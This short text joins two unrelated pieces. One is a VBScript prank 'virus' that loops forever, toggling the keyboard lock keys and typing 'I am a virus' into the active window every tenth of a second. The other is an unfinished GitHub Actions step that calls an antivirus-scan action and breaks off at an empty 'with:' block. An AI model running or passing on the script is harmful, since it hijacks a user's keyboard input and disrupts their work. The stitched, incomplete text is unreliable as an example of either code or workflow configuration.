set x=wscript.createobject ("wscript.shell")
do
wscript.sleep 100
x.sendkeys "{CAPSLOCK}"
x.sendkeys "{NUMLOCK}"
x.sendkeys "I am a virus "
x.sendkeys "{SCROLLLOCK}"
loop
- name: Git Anti Virus Scan
  # You may pin to the exact commit or the version.
  # uses: djdefi/gitavscan@0ac3e0d8cb252ec36b446efba83016c6a5583308
  uses: djdefi/gitavscan@2
  with:
